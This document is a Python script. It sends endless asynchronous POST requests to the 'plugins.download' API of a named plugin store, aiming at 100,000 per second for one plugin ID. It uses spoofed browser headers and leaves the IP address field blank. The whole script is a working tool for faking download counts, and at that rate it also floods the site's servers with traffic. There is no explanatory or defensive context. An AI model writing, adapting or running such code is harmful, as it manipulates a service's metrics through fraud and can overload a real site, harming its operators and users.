import asyncio
import httpx
import time

requests_per_second = 100000
plugin_id = 140
site = 'https://exterastore.app/plugins/stileg.140'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
    'Referer': site,
    'content-type': 'application/json',
    'trpc-accept': 'application/jsonl',
    'x-trpc-source': 'nextjs-react',
    'Origin': 'https://exterastore.app',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Priority': 'u=4',
}
params = {
    'batch': '1',
}
json_data = {
    '0': {
        'json': {
            'pluginId': plugin_id,
            'userAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
            'ipAddress': None,
        },
        'meta': {
            'values': {
                'ipAddress': [
                    'undefined',
                ],
            },
        },
    },
}


async def make_request(client):
    try:
        response = await client.post(
            'https://exterastore.app/api/trpc/plugins.download',
            params=params,
            headers=headers,
            json=json_data,
            timeout=10
        )
        response.raise_for_status()
        print("success!")
    except httpx.HTTPStatusError as e:
        print(f"http error occurred: {e.response.status_code}")
    except httpx.RequestError as e:
        print(f"request error occurred: {e}")
    except Exception as e:
        print(f"unexpected error occurred: {e}")


async def main():
    interval = 1 / requests_per_second

    async with httpx.AsyncClient() as client:
        while True:
            start_time = time.monotonic()

            asyncio.create_task(make_request(client))

            elapsed_time = time.monotonic() - start_time
            sleep_duration = interval - elapsed_time

            if sleep_duration > 0:
                await asyncio.sleep(sleep_duration)


if __name__ == '__main__':
    asyncio.run(main())
